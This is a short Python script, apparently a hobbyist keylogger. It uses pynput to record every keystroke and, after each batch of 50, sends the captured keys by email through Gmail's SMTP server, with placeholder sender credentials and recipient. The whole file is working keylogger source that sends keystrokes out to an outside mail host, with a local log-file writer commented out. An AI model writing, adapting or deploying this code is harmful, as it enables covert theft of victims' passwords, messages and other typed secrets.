import pynput
import smtplib


from pynput.keyboard import Key, Listener
count = 0
keys =[]

#def write_to_file(keys):  -->writes to the log.txt file but I diabled this function becuase this is uneccessary
#	with open("log.txt","a+") as f:
		
		#for key in keys: 
		#f.write(str(keys))




def on_press(key):
	global keys , count
	keys.append(key)
	count += 1
	print("{0}Pressed ".format(str(key)))

	x = 0
	while x < 1000:
		x = x+1
		if count >= 50:
			count = 0
			with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
				smtp.ehlo()
				smtp.starttls()
				smtp.ehlo()

				smtp.login('sender_mail', 'sender_password')
				subject = ('logfile')
				body = str(keys)

				msg = f'subject:{subject}\n\n{body}'

				smtp.sendmail("sender_mail", "recevier_mail", msg)
			#write_to_file(keys) -->writes to the log.txt file but I diabled this function becuase this is uneccessary
			keys = []


def on_release(key):
	if key == Key.esc:
		return True

with Listener (on_press=on_press,on_release=on_release) as listener:
	listener.join()





